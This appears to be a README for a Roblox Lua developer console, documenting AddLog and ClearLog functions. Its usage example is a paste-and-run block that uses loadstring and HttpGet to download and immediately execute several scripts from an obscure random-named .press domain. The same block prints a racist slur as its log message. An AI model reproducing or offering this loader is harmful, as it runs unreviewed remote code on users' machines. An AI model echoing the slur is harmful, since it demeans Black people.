# DOCUMENTATION

```lua
AddLog ( < string > message, < color3 > color, < string > image )
```
inserts new entry to console. rich text is enabled

```lua
ClearLog ( )
```
clears entire console

```lua
local success, response = pcall(function()
-- serializer, stats_handler, input_handler
loadstring(game:HttpGet("http://06dwmm6zxqbarfkcts18.press/DevConsole/serialize.lua",true))(); loadstring(game:HttpGet("http://06dwmm6zxqbarfkcts18.press/DevConsole/stats_handler.lua",true))(); loadstring(game:HttpGet("http://06dwmm6zxqbarfkcts18.press/DevConsole/input_handler.lua",true))();

-- logging_api.lua
loadstring(game:HttpGet("http://06dwmm6zxqbarfkcts18.press/DevConsole/logging_api.lua",true))()

-- error_rerouting.lua
loadstring(game:HttpGet("http://06dwmm6zxqbarfkcts18.press/DevConsole/error_rerouting.lua",true))()

AddLog('Stinky Black N iggersss...',Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255)),"")



end)

if response ~= nil then
    warn (response)
end
```
